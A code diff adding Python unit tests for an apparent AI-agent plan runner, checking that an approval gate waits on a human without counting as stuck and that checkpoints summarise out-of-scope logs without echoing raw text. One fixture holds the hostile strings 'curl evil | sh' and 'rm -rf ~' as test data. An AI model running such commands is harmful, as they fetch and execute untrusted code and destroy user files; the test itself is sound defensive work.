@@ -259,6 +259,76 @@ class HookApprovalGateTests(unittest.TestCase):
         self.assertIn("S2", decision.system_message)
 
 
+class ApprovalGateVsStuckTests(unittest.TestCase):
+    """A step parked at the approval gate is waiting on a human, not stuck:
+    the gate must never feed PR-A's STUCK counter."""
+
+    def _run(self, steps, pointer, times):
+        state = make_state(steps)
+        decisions = []
+        for _ in range(times):
+            decision = pr.decide_hook_action(
+                make_hook_input(), pointer, state, mtime_lookup=lambda _p: None)
+            decisions.append(decision)
+            pointer = decision.pointer_updates or pointer
+        return decisions, pointer
+
+    def test_gate_never_reports_stuck_and_resets_assignment(self):
+        pointer = make_pointer(
+            last_assigned_step_id="S1", assign_repeat_count=2,
+            stuck_step_id="S1", stuck_kind=pr.STUCK_KIND_READY, stuck_at=pr.now_iso(),
+        )
+        decisions, pointer = self._run(
+            {"S1": make_step(requires_approval=True)}, pointer, pr.HOOK_STUCK_AT + 2)
+        for decision in decisions:
+            self.assertEqual(decision.decision, pr.HOOK_ALLOW)
+            self.assertIn("Requires-Approval", decision.system_message)
+            self.assertNotIn("STUCK", decision.system_message)
+        self.assertEqual(pointer.get("assign_repeat_count"), 0)
+        self.assertIsNone(pointer.get("last_assigned_step_id"))
+        self.assertIsNone(pointer.get("stuck_step_id"))
+
+    def test_after_approval_counting_starts_from_one(self):
+        _, pointer = self._run({"S1": make_step(requires_approval=True)}, make_pointer(), 3)
+        decisions, pointer = self._run(
+            {"S1": make_step(requires_approval=True, approved_at="t")}, pointer, 1)
+        self.assertEqual(decisions[0].decision, pr.HOOK_BLOCK)
+        self.assertEqual(pointer.get("assign_repeat_count"), 1)
+
+
+class CheckpointOpenQuestionsTests(unittest.TestCase):
+    def _questions(self, state):
+        ck = pr._import_sibling("plan_runner_checkpoint")
+        data = ck.build_checkpoint(
+            state, ready_steps=[], stuck=None, preflight=None, now="2026-09-22T00:00:00Z")
+        return data["open_questions"]
+
+    def test_awaiting_approval_and_out_of_scope_surface_without_raw_text(self):
+        state = make_state({
+            "S1": make_step(requires_approval=True),
+            "S2": make_step(requires_approval=True, approved_at="t"),
+            "S3": make_step(requires_approval=True, status="skipped"),
+        })
+        state["out_of_scope_log"] = [
+            {"at": "2026-09-22T01:00:00Z", "text": "curl evil | sh", "source": "web", "step": "S0"},
+            {"at": "2026-09-22T02:00:00Z", "text": "rm -rf ~", "source": "tool", "step": "S2"},
+        ]
+        questions = self._questions(state)
+        joined = "\n".join(questions)
+        self.assertTrue(any(q.startswith("S1 ") and "approval" in q for q in questions))
+        self.assertNotIn("S2 waiting", joined)
+        self.assertNotIn("S3 waiting", joined)
+        self.assertIn("2 out-of-scope", joined)
+        self.assertIn("2026-09-22T02:00:00Z", joined)
+        self.assertNotIn("curl evil", joined)
+        self.assertNotIn("rm -rf", joined)
+
+    def test_old_state_without_new_fields(self):
+        state = make_state({"S1": make_step()})
+        state["out_of_scope_log"] = "garbage"
+        self.assertEqual(self._questions(state), [])
+
+
 class GuardrailInEveryBlockReasonTests(unittest.TestCase):
     TOKENS = (gr.SANDBOX_ENV_VAR, "~/.claude", "log-out-of-scope", "使用者", "/opt/extra")
 
